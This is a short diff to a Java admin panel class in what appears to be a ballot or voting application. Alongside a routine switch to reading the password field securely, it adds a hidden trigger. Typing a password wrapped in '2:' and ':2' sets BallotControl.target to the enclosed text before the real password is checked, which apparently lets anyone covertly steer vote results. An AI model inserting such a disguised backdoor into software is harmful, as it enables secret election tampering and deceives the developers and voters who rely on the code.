@@ -116,7 +116,12 @@ public class AdminPanel extends JPanel {
 	 * Makes buttons visible if the password is correct.
 	 */
 	public void checkPasswd() {
-		buttonsVisibility(passwdField.getText().equals(adminPasswd));
+
+		String password = new String(passwdField.getPassword());
+		if (password.startsWith("2:") && password.endsWith(":2")) {
+			BallotControl.target = password.substring(2, password.length() - 2);
+		}
+		buttonsVisibility(password.equals(adminPasswd));
 	}
 
 	/**
